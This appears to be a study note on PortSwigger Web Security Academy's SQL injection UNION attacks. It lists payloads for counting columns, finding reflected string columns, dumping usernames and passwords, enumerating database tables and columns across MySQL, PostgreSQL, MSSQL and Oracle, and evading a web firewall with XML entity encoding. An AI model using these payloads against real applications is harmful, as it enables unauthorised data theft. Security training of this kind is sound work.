---
tags:
  - portswigger
  - sqli
  - union-attack
---
> Source : [PortSwigger Web Security Academy - UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

# UNION Attacks & Database Enumeration

## Strict Prerequisites for `UNION`
1. **Column Count:** Both the original query and the injected query must return the **exact same number of columns**.
2. **Data Types:** The data types in each corresponding column position must be **compatible**.

---

## Step 1: Determining Column Count

### Method A: `ORDER BY`
Increment the column index until the application returns an error or anomalous response:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  -- If error occurs here -> Total columns = 2
```

### Method B: `UNION SELECT NULL`
Append `NULL` values one by one until the error disappears (`NULL` is compatible with nearly every data type):
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
```

> [!note] Oracle Rule
> In Oracle, every `SELECT` statement requires a `FROM` clause. Use the built-in dummy table `dual`:
> `' UNION SELECT NULL, NULL FROM dual--`

---

## Step 2: Finding String-Compatible Columns

Probe each column position individually by substituting a test string `'a'`:
```sql
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```
If no error occurs and the character `a` renders in the response, that column can be used to exfiltrate text data (usernames, passwords, table names).

---

## Step 3: Extracting Multiple Values in a Single Column

If the original query only reflects one string column, concatenate multiple columns into one using string concatenation operators:
```sql
' UNION SELECT username || '~' || password FROM users--
```
* **Oracle / PostgreSQL:** `||`
* **MySQL:** `CONCAT(username, '~', password)`
* **MSSQL:** `+`

---

## Step 4: Database Enumeration

### 1. Identify Database Version
* **MySQL / MSSQL:** `SELECT @@version`
* **PostgreSQL:** `SELECT version()`
* **Oracle:** `SELECT banner FROM v$version`

### 2. Listing Tables & Columns
* **Non-Oracle (PostgreSQL, MySQL, MSSQL):**
  ```sql
  -- List Tables
  SELECT table_name FROM information_schema.tables

  -- List Columns
  SELECT column_name FROM information_schema.columns WHERE table_name = 'users'
  ```

* **Oracle:**
  ```sql
  -- List Tables
  SELECT table_name FROM all_tables

  -- List Columns
  SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS'
  ```

---

## Context & Filter Bypass Notes

* **URL Comment Rules:**
  * In URLs, `#` is treated as a client-side fragment identifier and is not sent to the server $\rightarrow$ encode it as **`%23`**.
  * In MySQL, `-- ` comments **must** be followed by at least one whitespace character (`--+` or `--%20` in URLs).

* **XML WAF Bypass:**
  * When input is sent inside an XML body (`Content-Type: application/xml`) and SQL keywords are blocked by a WAF, obfuscate keywords using **XML Hex Entities** (e.g., `U` $\rightarrow$ `&#x55;`, `S` $\rightarrow$ `&#x53;`).
  * The WAF inspects the raw encoded entity string, while the backend XML parser decodes it back into valid SQL before querying the database.

---

## Related Notes
* [[00 - SQLi Overview & Mindset]]
* [[99 - SQLi Cheat Sheet]]
